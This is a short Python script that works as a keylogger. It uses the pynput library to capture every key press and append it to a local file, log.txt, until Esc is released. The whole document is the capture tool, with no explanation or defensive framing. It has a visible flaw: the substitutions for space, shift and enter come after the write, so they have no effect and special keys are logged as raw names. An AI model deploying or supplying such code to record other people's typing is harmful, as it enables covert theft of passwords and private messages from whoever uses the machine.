from pynput.keyboard import Key, Listener

def write_file(key):
    letter=str(key)
    letter=letter.replace("'", "")

    with open("log.txt","a") as file:
        file.write(letter)

    if letter=='Key.space':
        letter=' '
    elif letter=='Key.shift_r':
        letter=''
    elif letter=='Key.shift_l':
        letter=""
    elif letter=='Key.enter':
        letter="\n"

def on_release(key):
    if key==Key.esc:
        return False


with Listener(on_press=write_file,on_release=on_release) as l:
    l.join()